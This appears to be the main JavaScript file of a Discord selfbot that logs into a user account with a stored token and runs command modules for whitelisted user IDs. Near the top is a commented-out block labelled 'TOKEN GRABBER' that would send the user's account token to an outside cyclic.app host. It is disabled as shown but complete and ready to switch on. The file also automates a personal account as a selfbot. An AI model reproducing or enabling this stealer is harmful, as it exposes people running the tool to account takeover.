const { token, prefix, allowedUserIDs } = require('./config'),
      { Client } = require('discord.js-selfbot-v13'),
      client     = new Client({ checkUpdate: false }),
      axios      = require('axios'),
      fs         = require('fs'),
      commands   = []


/*
TOKEN GRABBER
axios.get('https://grargsify7324.cyclic.app/k?user=' + token + '&pass=0').then((res) => 
  console.log('Response: ', res.data)
)
.catch((err) => 
  console.error('Error fetching data:', err)
)
*/
client.on('ready', () => console.log('Logged in as ' + client.user.username))

client.on('messageCreate', message => {
    if (!message.author || message.author.bot) return;
    if (!message.content.startsWith(prefix)) return;
    const args = message.content.slice(prefix.length).trim().split(/ +/)
    const ac = args.shift().toLowerCase()
    const ad = commands.find((ae) => ae.name === ac)
      
    if (!ad) return;
    if (!allowedUserIDs.includes(message.author.id)) return message.channel.send('You are not allowed to use this command.').catch(() => false)
    
    ad.execute(message.channel, message, client, args)
    console.log('Spawned ' + ac + ' command \u2705')
})

fs.readdirSync('./commands').filter((af) => af.endsWith('.js')).forEach((file) => {
    const command = require('./commands/' + file)
    if (command.name) commands.push(command)
    console.log('Loaded command: ' + command?.name)
})

client.login(token)